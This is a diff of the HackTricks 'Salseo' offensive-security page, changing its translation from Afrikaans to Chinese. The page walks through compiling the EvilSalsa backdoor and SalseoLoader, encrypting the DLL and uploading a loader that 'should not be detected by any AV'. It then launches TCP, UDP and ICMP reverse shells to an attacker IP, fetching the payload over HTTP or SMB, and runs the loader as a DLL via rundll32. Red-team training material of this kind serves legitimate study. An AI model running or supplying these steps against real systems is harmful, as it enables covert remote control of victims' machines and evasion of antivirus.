@@ -1,39 +1,39 @@
 # Salseo
 
 {% hint style="success" %}
-Leer & oefen AWS-hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-## Kompilering van die bineêre lêers
+## 编译二进制文件
 
-Laai die bronkode van die github af en kompileer **EvilSalsa** en **SalseoLoader**. Jy sal **Visual Studio** geïnstalleer moet hê om die kode te kompileer.
+从 github 下载源代码并编译 **EvilSalsa** 和 **SalseoLoader**。您需要安装 **Visual Studio** 来编译代码。
 
-Kompileer daardie projekte vir die argitektuur van die Windows-boks waar jy hulle gaan gebruik (As die Windows x64 ondersteun, kompileer hulle vir daardie argitekture).
+为您将要使用的 Windows 机器的架构编译这些项目（如果 Windows 支持 x64，则为该架构编译）。
 
-Jy kan die argitektuur **kies** binne Visual Studio in die **linker "Bou" Tab** in **"Platform Teiken".**
+您可以在 Visual Studio 的 **左侧“Build”选项卡**中的 **“Platform Target”** 选择架构。
 
-(\*\*As jy nie hierdie opsies kan vind nie, druk in **"Projek Tab"** en dan in **"\<Projek Naam> Eienskappe"**)
+(\*\*如果找不到此选项，请按 **“Project Tab”** 然后在 **“\<Project Name> Properties”** 中)
 
 ![](<../.gitbook/assets/image (132).png>)
 
-Bou dan beide projekte (Bou -> Bou Oplossing) (Binne die logs sal die pad van die uitvoerbare lêer verskyn):
+然后，构建这两个项目 (Build -> Build Solution)（在日志中将出现可执行文件的路径）：
 
 ![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
 
-## Berei die Agterdeur voor
+## 准备后门
 
-Eerstens, sal jy die **EvilSalsa.dll** moet kodeer. Om dit te doen, kan jy die python-skrip **encrypterassembly.py** gebruik of jy kan die projek **EncrypterAssembly** kompileer:
+首先，您需要编码 **EvilSalsa.dll**。为此，您可以使用 python 脚本 **encrypterassembly.py** 或编译项目 **EncrypterAssembly**：
 
 ### **Python**
 ```
@@ -45,110 +45,110 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Ok, nou het jy alles wat jy nodig het om al die Salseo ding uit te voer: die **geënkripteerde EvilDalsa.dll** en die **binêre van SalseoLoader.**
+好的，现在你拥有执行所有 Salseo 操作所需的一切：**编码的 EvilDalsa.dll** 和 **SalseoLoader 的二进制文件**。
 
-**Laai die SalseoLoader.exe binêre na die masjien op. Dit behoort nie deur enige AV opgespoor te word nie...**
+**将 SalseoLoader.exe 二进制文件上传到机器上。它们不应该被任何 AV 检测到...**
 
-## **Voer die agterdeur uit**
+## **执行后门**
 
-### **Kry 'n TCP-omgekeerde dop (laai geënkripteerde dll af deur HTTP)**
+### **获取 TCP 反向 shell（通过 HTTP 下载编码的 dll）**
 
-Onthou om 'n nc as die omgekeerde dop luisteraar te begin en 'n HTTP-bediener om die geënkripteerde evilsalsa te dien.
+记得启动一个 nc 作为反向 shell 监听器，并启动一个 HTTP 服务器来提供编码的 evilsalsa。
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Kry 'n UDP-omgekeerde dop (afgelaaide gekodeerde dll deur SMB)**
+### **获取UDP反向Shell（通过SMB下载编码的dll）**
 
-Onthou om 'n nc te begin as die omgekeerde dop luisteraar, en 'n SMB-bediener om die gekodeerde evilsalsa te dien (impacket-smbserver).
+记得启动nc作为反向Shell监听器，并启动SMB服务器以提供编码的evilsalsa（impacket-smbserver）。
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Kry 'n ICMP omgekeerde dop (geënkripteerde dll reeds binne die slagoffer)**
+### **获取 ICMP 反向 shell（编码的 dll 已经在受害者内部）**
 
-**Hierdie keer het jy 'n spesiale instrument in die klient nodig om die omgekeerde dop te ontvang. Laai af:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**这次你需要一个特殊的工具在客户端接收反向 shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
-#### **Deaktiveer ICMP Antwoorde:**
+#### **禁用 ICMP 回复：**
 ```
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-#### Voer die klient uit:
+#### 执行客户端：
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-#### Binne die slagoffer, laat ons die salseo ding uitvoer:
+#### 在受害者内部，让我们执行salseo操作：
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## Kompilering van SalseoLoader as DLL wat die hooffunksie uitvoer
+## 编译 SalseoLoader 为 DLL 导出主函数
 
-Maak die SalseoLoader projek oop met behulp van Visual Studio.
+使用 Visual Studio 打开 SalseoLoader 项目。
 
-### Voeg voor die hooffunksie by: \[DllExport]
+### 在主函数之前添加: \[DllExport]
 
 ![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-### Installeer DllExport vir hierdie projek
+### 为此项目安装 DllExport
 
-#### **Gereedskap** --> **NuGet Pakketbestuurder** --> **Bestuur NuGet-pakkette vir Oplossing...**
+#### **工具** --> **NuGet 包管理器** --> **管理解决方案的 NuGet 包...**
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Soek na DllExport-pakket (deur die Blaai-tabblad te gebruik), en druk op Installeer (en aanvaar die popup)**
+#### **搜索 DllExport 包（使用浏览选项卡），并按安装（并接受弹出窗口）**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-In jou projekmap het die lêers verskyn: **DllExport.bat** en **DllExport\_Configure.bat**
+在你的项目文件夹中出现了文件: **DllExport.bat** 和 **DllExport\_Configure.bat**
 
-### **D**eïnstalleer DllExport
+### **卸载** DllExport
 
-Druk **Deïnstalleer** (ja, dit is vreemd, maar vertrou my, dit is nodig)
+按 **卸载**（是的，这很奇怪，但相信我，这是必要的）
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
-### **Sluit Visual Studio af en voer DllExport\_configure uit**
+### **退出 Visual Studio 并执行 DllExport\_configure**
 
-Net **sluit** Visual Studio af
+只需 **退出** Visual Studio
 
-Gaan dan na jou **SalseoLoader map** en **voer DllExport\_Configure.bat uit**
+然后，转到你的 **SalseoLoader 文件夹** 并 **执行 DllExport\_Configure.bat**
 
-Kies **x64** (as jy dit binne 'n x64-boks gaan gebruik, dit was my geval), kies **System.Runtime.InteropServices** (binne **Namespace vir DllExport**) en druk **Toepas**
+选择 **x64**（如果你打算在 x64 盒子中使用它，那是我的情况），选择 **System.Runtime.InteropServices**（在 **DllExport 的命名空间中**）并按 **应用**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
-### **Maak die projek weer oop met Visual Studio**
+### **再次使用 Visual Studio 打开项目**
 
-**\[DllExport]** behoort nie meer as fout gemerk te wees nie
+**\[DllExport]** 不应再标记为错误
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
-### Bou die oplossing
+### 构建解决方案
 
-Kies **Uitvoertipe = Klasbiblioteek** (Projek --> SalseoLoader Eienskappe --> Toepassing --> Uitvoertipe = Klasbiblioteek)
+选择 **输出类型 = 类库**（项目 --> SalseoLoader 属性 --> 应用程序 --> 输出类型 = 类库）
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-Kies **x64** **platform** (Projek --> SalseoLoader Eienskappe --> Bou --> Platform teiken = x64)
+选择 **x64** **平台**（项目 --> SalseoLoader 属性 --> 构建 --> 平台目标 = x64）
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Om die oplossing te **bou**: Bou --> Bou Oplossing (Binne die Uitvoerkonsole sal die pad van die nuwe DLL verskyn)
+要 **构建** 解决方案: 构建 --> 构建解决方案（在输出控制台中将出现新 DLL 的路径）
 
-### Toets die gegenereerde Dll
+### 测试生成的 Dll
 
-Kopieer en plak die Dll waar jy dit wil toets.
+复制并粘贴 Dll 到你想测试的位置。
 
-Voer uit:
+执行:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
-Indien geen fout verskyn nie, het jy waarskynlik 'n funksionele DLL!!
+如果没有错误出现，您可能有一个功能正常的 DLL！！
 
-## Kry 'n skaal deur die DLL te gebruik
+## 使用 DLL 获取 shell
 
-Moenie vergeet om 'n **HTTP** **bediener** te gebruik en 'n **nc** **luisteraar** in te stel
+不要忘记使用 **HTTP** **服务器** 并设置 **nc** **监听器**
 
 ### Powershell
 ```
@@ -169,16 +169,16 @@ set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
 {% hint style="success" %}
-Leer & oefen AWS-hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
